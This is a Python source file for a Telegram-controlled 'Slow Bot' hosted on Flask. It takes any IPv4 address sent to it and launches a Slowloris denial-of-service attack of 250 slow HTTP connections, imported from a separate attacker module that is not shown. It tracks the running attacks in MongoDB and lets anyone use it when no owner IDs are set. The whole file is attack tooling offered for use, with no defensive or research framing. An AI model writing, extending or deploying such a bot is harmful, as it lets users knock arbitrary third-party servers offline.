import asyncio
import logging
import os
import re
import threading
import time

import requests
from flask import Flask, jsonify, request

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

from attacker import SlowlorisAttack
from db import active_jobs, add_job, delete_stopped, heartbeat, mark_stopped, reset_stale

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_IDS = [int(x) for x in os.getenv("OWNER_IDS", "").split(",") if x.strip()]
DEFAULT_PORT = int(os.getenv("DEFAULT_PORT", "80"))
DEFAULT_CONN = int(os.getenv("DEFAULT_CONN", "250"))
PORT = int(os.getenv("PORT", "10000"))                       # Render injects this
SELF_URL = (os.getenv("RENDER_EXTERNAL_URL") or os.getenv("SELF_URL") or "").rstrip("/")
PING_INTERVAL = int(os.getenv("PING_INTERVAL", "600"))       # seconds = 10 minutes

IP_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")
IPPORT_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$")

attacks = {}  # chat_id -> SlowlorisAttack


def allowed(update: Update) -> bool:
    if not OWNER_IDS:
        return True
    return update.effective_user.id in OWNER_IDS


def valid_ip(ip: str) -> bool:
    if not IP_RE.match(ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split("."))


def parse_target(text: str):
    text = text.strip().replace(" ", "")
    if IPPORT_RE.match(text):
        ip, port = text.rsplit(":", 1)
        return ip, int(port)
    if valid_ip(text):
        return text, DEFAULT_PORT
    return None, None


# ---------------- Telegram handlers ----------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    await update.message.reply_text(
        "🤖 *Slow Bot*\n\n"
        "Send me a target IP and I'll saturate it with slow HTTP connections.\n\n"
        "• `203.0.113.10` — default port 80\n"
        "• `203.0.113.10:443` — custom port\n\n"
        "Commands:\n`/stop` · `/status` · `/clean`",
        parse_mode="Markdown",
    )


async def handle_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")

    chat_id = update.effective_chat.id
    ip, port = parse_target(update.message.text)
    if not ip:
        return await update.message.reply_text(
            "❌ Invalid IPv4. Try `203.0.113.10` or `203.0.113.10:8080`."
        )

    if chat_id in attacks and attacks[chat_id].is_running:
        return await update.message.reply_text("⚠️ Attack already running. Use `/stop` first.")

    attack = SlowlorisAttack(
        target=ip,
        port=port,
        max_conn=DEFAULT_CONN,
        on_heartbeat=lambda c: heartbeat(chat_id, c),
    )
    attacks[chat_id] = attack
    add_job(chat_id, ip, port, DEFAULT_CONN)
    attack.start()

    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⛔ Stop Attack", callback_data="stop")]])
    await update.message.reply_text(
        f"🚀 Attack started against `{ip}:{port}`\n"
        f"• Connections: `{DEFAULT_CONN}`\n"
        f"• Status: `running` (saved in MongoDB)",
        parse_mode="Markdown",
        reply_markup=kb,
    )
    logger.info("Attack started on %s:%s", ip, port)


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    chat_id = update.effective_chat.id
    attack = attacks.get(chat_id)
    if not attack or not attack.is_running:
        return await update.message.reply_text("ℹ️ No running attack.")
    attack.stop()
    mark_stopped(chat_id)
    attacks.pop(chat_id, None)
    await update.message.reply_text("🛑 Attack stopped. All sockets closed.")


async def stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    attack = attacks.get(chat_id)
    if attack and attack.is_running:
        attack.stop()
        mark_stopped(chat_id)
        attacks.pop(chat_id, None)
        await query.edit_message_text("🛑 Attack stopped. All sockets closed.")
    else:
        await query.edit_message_text("ℹ️ No running attack.")


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    jobs = active_jobs()
    if not jobs:
        return await update.message.reply_text("ℹ️ No active attacks in MongoDB.")
    lines = ["📊 *Active attacks:*"]
    for j in jobs:
        lines.append(
            f"• `{j['target']}:{j['port']}` — {j.get('connections', 0)} conns, "
            f"started {j['started_at'].strftime('%H:%M UTC')}"
        )
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")


async def clean_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return await update.message.reply_text("⛔ Not authorized.")
    n = delete_stopped()
    await update.message.reply_text(f"🧹 Removed {n} stopped job(s).")


# ---------------- Bot build + webhook ----------------

def build_bot() -> Application:
    bot = Application.builder().token(BOT_TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(CommandHandler("stop", stop_cmd))
    bot.add_handler(CommandHandler("status", status_cmd))
    bot.add_handler(CommandHandler("clean", clean_cmd))
    bot.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop$"))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip))
    return bot


application = build_bot()

app = Flask(__name__)


@app.get("/")
def index():
    return jsonify({"service": "slowbot", "status": "ok"})


@app.get("/health")
def health():
    running = [a for a in attacks.values() if a.is_running]
    return jsonify({"ok": True, "active_attacks": len(running)})


@app.post("/webhook")
def webhook():
    """Telegram pushes every update here (no polling)."""
    try:
        update = Update.de_json(request.get_json(force=True), application.bot)
        asyncio.run(application.process_update(update))
        return ("ok", 200)
    except Exception as e:
        logger.exception("Webhook error: %s", e)
        return ("error", 500)


# ---------------- Self-ping keep-alive ----------------

def self_ping_loop():
    url = f"{SELF_URL}/health"
    logger.info("Self-ping thread started → %s every %ss", url, PING_INTERVAL)
    while True:
        time.sleep(PING_INTERVAL)
        try:
            r = requests.get(url, timeout=15)
            logger.info("Self-ping → %s (%s)", r.status_code, r.text[:40])
        except Exception as e:
            logger.warning("Self-ping failed: %s", e)


# ---------------- Startup ----------------

def register_webhook():
    if not SELF_URL:
        logger.warning("RENDER_EXTERNAL_URL not set — webhook skipped, falling back to polling")
        threading.Thread(target=_polling_fallback, daemon=True).start()
        return

    async def _set():
        await application.initialize()
        await application.bot.set_webhook(url=f"{SELF_URL}/webhook")
        info = await application.bot.get_webhook_info()
        logger.info("Webhook registered: %s", info.url)

    asyncio.run(_set())


def _polling_fallback():
    asyncio.set_event_loop(asyncio.new_event_loop())
    application.run_polling(allowed_updates=Update.ALL_TYPES)


def main():
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN env var is required")
    reset_stale()
    threading.Thread(target=self_ping_loop, daemon=True).start()
    register_webhook()
    logger.info("Serving on port %s", PORT)
    app.run(host="0.0.0.0", port=PORT, threaded=True)


if __name__ == "__main__":
    main()
